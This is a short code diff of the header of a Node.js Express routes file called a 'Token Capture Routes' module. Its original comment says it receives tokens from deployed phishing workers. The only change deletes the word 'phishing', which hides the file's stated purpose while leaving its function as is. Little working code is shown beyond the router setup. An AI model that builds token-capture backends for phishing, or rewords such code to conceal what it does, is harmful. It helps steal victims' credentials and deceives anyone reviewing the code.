@@ -1,6 +1,6 @@
 /**
  * VGenius C Engine - Token Capture Routes
- * Receives tokens from deployed phishing workers
+ * Receives tokens from deployed workers
  */
 const express = require('express');
 const router = express.Router();
